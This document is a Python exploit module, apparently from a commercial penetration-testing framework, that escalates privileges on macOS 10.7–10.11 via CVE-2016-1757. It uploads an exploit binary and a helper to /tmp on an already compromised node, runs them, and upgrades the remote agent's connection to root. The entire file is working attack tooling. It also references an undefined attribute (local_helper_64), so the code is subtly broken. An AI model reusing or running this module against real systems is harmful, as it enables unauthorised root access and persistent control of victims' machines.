#!/usr/bin/env python

# This module allows you to elevate privileges on an OSX mosdef node
# using a blackbox binary that returns a root shell ... this is
# useful for whem you have 'outside' exploits that you want to use
# in conjunction with your MOSDEF node.

import sys
import time

from exploitutils import *

from ExploitTypes.osxLocalExploit import osxLocalExploit
from canvaserror import *

import logging

if '.' not in sys.path:
    sys.path.append('.')


NAME                           = 'Shellelevate: CVE-2016-1757'
DESCRIPTION                    = 'Elevate MOSDEF Node privileges'
DOCUMENTATION                  = {}
DOCUMENTATION['VENDOR']        = 'Apple'
DOCUMENTATION['Repeatability'] = 'Multiple Times'
DOCUMENTATION['CVE Name']      = 'CVE-2016-1757'
DOCUMENTATION['CVE Url']       = 'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-1757'

VERSION                        = '1.0'
PROPERTY                       = {}
PROPERTY['TYPE']               = 'Exploit'
PROPERTY['SITE']               = 'Local'
PROPERTY['ARCH']               = [ ['Mac OS X'] ]
PROPERTY['VERSION']            = [ '10.7', '10.8', '10.9', '10.10', '10.11' ]

DOCUMENTATION['NOTES'] = """
"""


class theexploit(osxLocalExploit):
    def __init__(self):
        osxLocalExploit.__init__(self)
        self.name          = NAME
        self.node          = None
        self.local_res     = os.path.join(os.path.dirname(__file__), 'Resources')
        self.local_exp     = os.path.join(self.local_res, 'x')
        self.local_helper  = os.path.join(self.local_res, 'h')
        self.remote_exp    = '/tmp/x' # remote path exploit
        self.remote_helper = '/tmp/h' # remote path helper

    def neededListenerTypes(self):
        return []

    def run(self):
        for node in self.argsDict['passednodes']:
            self.summary[node] = 0
            self.node = node
            self.setInfo("%s (in progress on node %s)" % (self.name, self.node))

            if self.node.shell is None:
                logging.error("Node has no shell server available. Bailing")
                self.setInfo("%s Bailing (Node has no shell server available)" % (self.name))
                continue

            if not self.is_osx_node():
                continue

            if self.compromised(self.remote_helper, 0):
                logging.warning('Already compromised')
                logging.info('Initing elevated MOSDEF loop')
                self.fork_and_exec(self.remote_helper, wait = 1)
                logging.info('Done')
                self.setInfo("%s Done (Success)" % (self.name))
                self.setProgress(100)
                self.add_file_for_cleanup(self.remote_helper)
                continue

            logging.info('Uploading helper and exploit')
            if self.nodeUpload(self.local_exp, self.remote_exp) == False:
                self.setInfo("%s Done (Failed to upload exploit)" % (self.name))
                continue
            self.setProgress(30)

            if self.nodeUpload(self.local_helper_64, self.remote_helper) == False:
                self.setInfo("%s Done (Failed to upload helper)" % (self.name))
                continue
            self.setProgress(60)

            self.add_file_for_cleanup(self.remote_exp)
            self.add_file_for_cleanup(self.remote_helper)

            logging.info('Executing exploit')

            args = {}
            args['string_1'] = 'h'

            self.fork_and_exec(self.remote_exp, argv=args)
            logging.info('Waiting...')

            self.setProgress(90)

            # wait 20 secs for the exploit to complete
            wait_secs = 20
            if self.compromised(self.remote_helper, wait_secs):
                logging.warning('Compromised!')
                logging.info('Upgrading MOSDEF connection loop')
                self.fork_and_exec(self.remote_helper, wait = 1)
                logging.info('Done')
                self.setInfo("%s Done (Success)" % (self.name))
                self.summary[node] = 1
            else:
                logging.error('Looks like we failed, try again!')
                self.setInfo("%s Done (Failed)" % (self.name))
                self.setProgress(-1)

        return True
